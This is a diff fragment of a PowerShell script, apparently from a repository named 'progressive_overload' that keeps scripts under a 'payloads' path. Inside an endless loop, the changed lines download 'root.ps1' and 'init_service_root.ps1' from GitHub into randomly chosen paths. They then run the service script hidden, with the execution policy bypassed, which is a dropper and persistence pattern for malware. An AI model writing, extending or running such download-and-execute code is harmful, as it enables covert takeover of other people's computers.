@@ -50,9 +50,11 @@ while ($true) {
         $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
         $rootPath = "$rootPath\root.ps1"
         iwr -uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/root.ps1" -OutFile $rootPath
+        iwr -uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_root.ps1" -OutFile $initServicePath
+        powershell.exe -ep bypass -noP -w hidden $initServicePath -rootScriptPath $rootPath
     }
     
-    if($regS -or $serv){
+    elseif($regS -or $serv){
         iwr -uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_root.ps1" -OutFile $initServicePath
         powershell.exe -ep bypass -noP -w hidden $initServicePath -rootScriptPath $rootPath
     }
